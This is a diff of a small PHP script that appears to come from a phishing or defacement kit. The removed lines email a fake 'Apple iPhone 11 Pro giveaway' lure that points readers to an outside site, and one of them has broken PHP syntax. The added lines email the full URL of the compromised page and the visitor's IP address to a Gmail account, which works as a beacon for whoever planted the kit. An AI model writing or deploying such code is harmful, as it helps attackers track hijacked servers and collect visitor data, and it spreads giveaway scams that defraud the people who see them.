@@ -1,6 +1,6 @@
 <?php
-$tujuanmail = 'user54487215@gmail.com ,user54487215@gmail.com ,user54487215@gmail.com ,user54487215@gmail.com ';
-$x_path = "Apple Giveaways 2021" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "To Get New Brand Iphone 11 PRO You Have To Viste https://jarba.com.mx And Complete The offer " ]";
-mail($tujuanmail, "Giveaways By Aplle IPhone 11 Pro 2021 Worldwide", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+$tujuanmail = 'user54487215@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "Contact Me", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
